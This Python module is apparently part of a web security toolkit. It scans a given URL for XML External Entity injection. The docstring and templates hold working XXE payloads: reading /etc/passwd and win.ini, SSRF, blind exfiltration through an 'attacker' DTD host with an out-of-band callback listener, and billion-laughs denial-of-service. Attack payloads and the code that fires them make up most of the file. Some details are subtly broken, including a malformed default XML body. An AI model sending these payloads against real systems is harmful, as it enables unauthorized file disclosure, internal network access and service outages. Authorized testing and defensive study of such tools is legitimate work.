"""
XML External Entity (XXE) injection detection.

An XXE vulnerability exists when an application parses XML input and
resolves external entities without proper restrictions. The attacker
can:

  1. Read local files:
       <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
       <root>&xxe;</root>

  2. Make SSRF requests:
       <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal/secret">]>
       <root>&xxe;</root>

  3. Trigger blind out-of-band exfiltration:
       <!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">
                      <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
                      %dtd;]>
       <root>&send;</root>

  4. Denial of service (billion laughs):
       <!DOCTYPE lolz [
         <!ENTITY lol "lol">
         <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
         ... up to lol9 ...]>

Detection strategy:

  For each endpoint that accepts XML:

    A. Non-blind XXE (reflected in response)
       Send an XML body with an external entity pointing at a known
       file with a known signature. Look for the signature in the
       response.

    B. Blind XXE (needs OOB)
       Send an XML body with an external entity pointing at our HTTP
       listener. Wait for the callback.

    C. Error-based XXE
       Some apps parse XML but strip entity declarations. Triggering
       a parsing error with a specific malformed payload may reveal
       information about the parser and its configuration.

  The module sends payloads to endpoints that:

    - Have a JSON or XML Content-Type already
    - Accept POST/PUT with a body
    - Return XML Content-Type

  We don't blindly fuzz every endpoint — we look for XML-shaped
  requests and only test those.

Usage:

    from vuln.xxe import test_url

    findings = await test_url(
        "https://example.com/api/xml",
        session, limiter,
        body='<?xml version="1.0"?><root><name>x</name></root>')

    # CLI
    python -m vuln.xxe "https://example.com/api/xml" \\
        --body '<?xml version="1.0"?><root>x</root>'
    python -m vuln.xxe "https://example.com/api/xml" --oob

Findings written to the store:
    one row per vulnerable endpoint
"""

import asyncio
import secrets
from urllib.parse import urlparse

from core.http import new_session, fetch, RateLimiter, parse_cookie_string
from core.output import info, success, warn, error


# ---------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------

# Signature strings to look for in responses when we read local files
FILE_SIGNATURES = {
    "/etc/passwd":             ["root:x:0:0:", "daemon:x:1:1"],
    "/etc/hosts":              ["127.0.0.1"],
    "C:\\Windows\\win.ini":    ["[fonts]"],
    "/etc/hostname":           [],   # no signature — any content is a hit
}


# XXE payload templates. {file} is the file path, {callback} is our
# OOB URL.
XXE_PAYLOADS = [
    # Standard file read via external entity
    ("file_read_simple",
     '<?xml version="1.0" encoding="UTF-8"?>\n'
     '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file}">]>\n'
     '<root><data>&xxe;</data></root>'),

    # Parameter entity version (for blind XXE)
    ("file_read_param_entity",
     '<?xml version="1.0" encoding="UTF-8"?>\n'
     '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file://{file}"> %xxe;]>\n'
     '<root/>'),

    # OOB via DTD
    ("oob_dtd",
     '<?xml version="1.0" encoding="UTF-8"?>\n'
     '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback}"> %xxe;]>\n'
     '<root/>'),

    # OOB direct (some parsers accept this)
    ("oob_direct",
     '<?xml version="1.0" encoding="UTF-8"?>\n'
     '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback}">]>\n'
     '<root><data>&xxe;</data></root>'),

    # XXE in attribute
    ("file_read_attr",
     '<?xml version="1.0" encoding="UTF-8"?>\n'
     '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file}">]>\n'
     '<root attr="&xxe;"/>'),
]


# Error-based probes to detect XML parsers even when entities are
# stripped
ERROR_PROBES = [
    ("malformed_tag",  "<?xml version=\"1.0\"?><root><unclosed>"),
    ("bad_entity",     "<?xml version=\"1.0\"?><root>&undefined;</root>"),
    ("bad_doctype",    "<?xml version=\"1.0\"?><!DOCTYPE><root/>"),
    ("billion_laughs",
     '<?xml version="1.0"?>\n'
     '<!DOCTYPE lolz [\n'
     '  <!ENTITY lol "lol">\n'
     '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n'
     '  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n'
     ']>\n'
     '<lolz>&lol3;</lolz>'),
]


# ---------------------------------------------------------------------
# Response helpers
# ---------------------------------------------------------------------

def _check_file_signature(body: str, path: str) -> str | None:
    """Return matching signature for the given file path, or None."""
    sigs = FILE_SIGNATURES.get(path, [])
    if not sigs:
        # No signature defined — return marker if body looks non-empty
        return None
    for sig in sigs:
        if sig in body:
            return sig
    return None


def _looks_like_xml_error(body: str) -> bool:
    """Return True if the response looks like an XML parsing error."""
    if not body:
        return False
    low = body.lower()
    patterns = [
        "xml parsing error", "xmlparseerror", "xml syntax error",
        "saxparseexception", "invalid xml", "not well-formed",
        "unexpected end of file", "no element found",
        "entity", "doctype", "external entity",
    ]
    return any(p in low for p in patterns)


# ---------------------------------------------------------------------
# Detection
# ---------------------------------------------------------------------

async def _post_xml(session, url: str, body: str, headers: dict,
                     limiter, cookies=None,
                     timeout: float = 10.0) -> tuple | None:
    """POST an XML body. Returns (status, headers, body, elapsed) or None."""
    try:
        r = await fetch(
            session, url, limiter,
            method="POST",
            headers=headers,
            data=body.encode("utf-8") if isinstance(body, str) else body,
            cookies=cookies,
            timeout=timeout,
            allow_redirects=False,
        )
    except Exception:
        return None
    if r is None or r[0] is None:
        return None
    return r


# ---------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------

async def test_url(url: str, session=None, limiter=None,
                    cookies=None, body: str | None = None,
                    content_type: str = "application/xml",
                    verbose: bool = False, timeout: float = 10.0,
                    rate: float = 10.0,
                    oob_config=None) -> list[dict]:
    """Test an endpoint for XXE.

    Args:
        url:           target POST endpoint
        session:       aiohttp session
        limiter:       RateLimiter
        cookies:       cookies dict
        body:          sample XML body (used as template to splice into)
        content_type:  Content-Type header (default application/xml)
        verbose:       print each payload
        timeout:       per-request timeout
        rate:          requests per second
        oob_config:    optional OOBConfig with HTTP listener

    Returns list of findings.
    """
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"

    if body is None:
        # Minimal default XML body
        body = '<?xml version="1.0" encoding="UTF-8"?><root><data>x</name></root>'

    own_session = session is None
    if own_session:
        session = new_session()
    if limiter is None:
        limiter = RateLimiter(rate=rate)

    info(f"xxe: testing {url} ({len(XXE_PAYLOADS)} file payloads)")

    findings: list[dict] = []
    base_headers = {
        "Content-Type": content_type,
        "Accept": "application/xml, text/xml, */*",
        "User-Agent": "Mozilla/5.0 (compatible; toolkit-xxe/0.1)",
    }

    try:
        # Baseline: send the original body, capture response shape
        try:
            base_r = await _post_xml(session, url, body, base_headers,
                                      limiter, cookies=cookies,
                                      timeout=timeout)
        except Exception as e:
            warn(f"xxe: baseline failed: {type(e).__name__}: {e}")
            return []
        if base_r is None:
            warn("xxe: baseline request failed")
            return []

        baseline = {
            "status": base_r[0],
            "body": base_r[2] or "",
        }

        if verbose:
            info(f"  baseline: status={baseline['status']} "
                 f"len={len(baseline['body'])}")

        # --- Test each payload ---
        tested = 0

        for payload_name, template in XXE_PAYLOADS:
            # Skip OOB payloads if we don't have a listener
            is_oob = "{callback}" in template
            if is_oob and oob_config is None:
                continue

            tested += 1

            # Build the actual payload
            if is_oob:
                marker = f"xxe-{secrets.token_hex(4)}"
                callback_url = (f"http://{oob_config.public_host}:"
                                f"{oob_config.http_public_port}/{marker}")
                xml_body = template.format(callback=callback_url)
            else:
                # Try each file target
                for file_path in ("/etc/passwd", "C:\\Windows\\win.ini"):
                    xml_body = template.format(file=file_path)
                    r = await _post_xml(
                        session, url, xml_body, base_headers,
                        limiter, cookies=cookies, timeout=timeout)
                    if r is None:
                        continue
                    resp_status, _resp_headers, resp_body, _final = r
                    resp_body = resp_body or ""

                    # File signature check
                    sig = _check_file_signature(resp_body, file_path)
                    if sig:
                        finding = {
                            "type": "xxe",
                            "severity": "critical",
                            "url": url,
                            "param": "body",
                            "injection_kind": "body",
                            "method": "POST",
                            "payload": xml_body[:400],
                            "http_status": resp_status,
                            "evidence": (f"Read {file_path} — "
                                          f"signature '{sig}' in response"),
                            "data": {
                                "kind": "file_read",
                                "file": file_path,
                                "signature": sig,
                                "payload_name": payload_name,
                                "response_snippet": resp_body[:300],
                            },
                        }
                        findings.append(finding)
                        success(f"  [VULN] {payload_name}: read "
                                f"{file_path}")
                        if verbose:
                            info(f"      evidence: {sig!r}")
                        break
                    # Response changed to XML error?
                    elif _looks_like_xml_error(resp_body) and \
                            not _looks_like_xml_error(baseline["body"]):
                        finding = {
                            "type": "xxe",
                            "severity": "medium",
                            "url": url,
                            "param": "body",
                            "injection_kind": "body",
                            "method": "POST",
                            "payload": xml_body[:400],
                            "http_status": resp_status,
                            "evidence": (f"XML parsing error triggered — "
                                          f"possible XXE parse of "
                                          f"{file_path}"),
                            "data": {
                                "kind": "error_based",
                                "file": file_path,
                                "payload_name": payload_name,
                                "response_snippet": resp_body[:300],
                            },
                        }
                        findings.append(finding)
                        success(f"  [VULN] {payload_name}: "
                                f"XML error triggered")
                        break

                continue  # already looped over files inside

            # OOB path
            if is_oob:
                r = await _post_xml(session, url, xml_body, base_headers,
                                     limiter, cookies=cookies,
                                     timeout=timeout)
                if r is None:
                    continue
                # Wait for a callback
                if oob_config.http is not None:
                    hit = await oob_config.http.wait_for_hit(
                        marker, timeout=5.0)
                    if hit:
                        finding = {
                            "type": "xxe",
                            "severity": "critical",
                            "url": url,
                            "param": "body",
                            "injection_kind": "body",
                            "method": "POST",
                            "payload": xml_body[:400],
                            "http_status": r[0],
                            "evidence": (f"OOB callback from "
                                          f"{hit['remote']}"),
                            "data": {
                                "kind": "oob",
                                "payload_name": payload_name,
                                "remote": hit["remote"],
                                "path": hit["path"],
                            },
                        }
                        findings.append(finding)
                        success(f"  [VULN] {payload_name}: OOB callback")
                        break

        if not findings and verbose:
            info("  no XXE detected")

        return findings
    finally:
        if own_session:
            await session.close()


# ---------------------------------------------------------------------
# CLI entry
# ---------------------------------------------------------------------

async def run(target: str, store=None, verbose: bool = False,
               cookie: str | None = None,
               body: str | None = None,
               content_type: str = "application/xml",
               rate: float = 10.0,
               oob: bool = False,
               oob_http_port: int = 9876,
               oob_public: str | None = None) -> list[dict]:
    """CLI entry. Writes findings to store if provided."""
    cookies = parse_cookie_string(cookie) if cookie else None

    # If --body-file or --body given, load it
    if body and body.startswith("@"):
        # Read from file
        from pathlib import Path
        p = Path(body[1:])
        if p.exists():
            body = p.read_text(encoding="utf-8")
        else:
            warn(f"xxe: body file not found: {p}")

    oob_config = None
    oob_cleanup = None
    if oob:
        try:
            from vuln import oob as oob_mod
        except ImportError:
            warn("xxe: OOB module not available")
        else:
            http_listener = oob_mod.OOBListener(
                port=oob_http_port,
                bind_addr="0.0.0.0" if oob_public else "127.0.0.1",
                verbose=verbose)
            try:
                await http_listener.start()
            except RuntimeError as e:
                warn(f"xxe: could not start HTTP listener: {e}")
            else:
                oob_config = oob_mod.OOBConfig(
                    dns_listener=None,
                    http_listener=http_listener,
                    public_host=oob_public or "127.0.0.1")
                oob_config.http_public_port = oob_http_port

                async def _cleanup():
                    await http_listener.stop()
                oob_cleanup = _cleanup

    try:
        findings = await test_url(
            target, cookies=cookies, body=body,
            content_type=content_type,
            verbose=verbose, rate=rate, oob_config=oob_config)
    finally:
        if oob_cleanup is not None:
            await oob_cleanup()

    print()
    if not findings:
        info(f"no XXE detected on {target}")
    else:
        success(f"{len(findings)} XXE finding(s)")

    if store is not None:
        for f in findings:
            store.add_finding({
                "module": "xxe",
                "type": f["type"],
                "severity": f["severity"],
                "target": f["url"],
                "payload": f["payload"],
                "evidence": f["evidence"],
                "data": f["data"],
            })
        if findings:
            success(f"wrote {len(findings)} finding(s) to store")

    return findings


# ---------------------------------------------------------------------
# CLI when run directly
# ---------------------------------------------------------------------

def _cli():
    import argparse
    p = argparse.ArgumentParser(
        prog="vuln.xxe",
        description="Detect XML External Entity (XXE) injection.",
    )
    p.add_argument("target", help="POST endpoint that accepts XML")
    p.add_argument("--body", default=None,
                   help="sample XML body; use @path to read from file")
    p.add_argument("--content-type", default="application/xml",
                   help="Content-Type header (default application/xml)")
    p.add_argument("--cookie", default=None,
                   help="cookie string for authenticated testing")
    p.add_argument("--rate", type=float, default=10.0,
                   help="requests per second (default 10)")
    p.add_argument("--oob", action="store_true",
                   help="start HTTP listener for blind XXE detection")
    p.add_argument("--oob-http-port", type=int, default=9876,
                   help="OOB HTTP listener port (default 9876)")
    p.add_argument("--oob-public", default=None,
                   help="public hostname/IP the target should call back")
    p.add_argument("--store", action="store_true",
                   help="write findings to active workspace")
    p.add_argument("-v", "--verbose", action="store_true")
    args = p.parse_args()

    store = None
    if args.store:
        from core.workspace import get_active, get_workspace
        from core.store import open_store
        active = get_active()
        if not active:
            warn("no active workspace; use `toolkit workspace switch`")
        else:
            ws = get_workspace(active)
            store = open_store(ws.db_path, workspace_name=active)

    asyncio.run(run(
        args.target, store=store, verbose=args.verbose,
        cookie=args.cookie, body=args.body,
        content_type=args.content_type, rate=args.rate,
        oob=args.oob, oob_http_port=args.oob_http_port,
        oob_public=args.oob_public))


if __name__ == "__main__":
    _cli()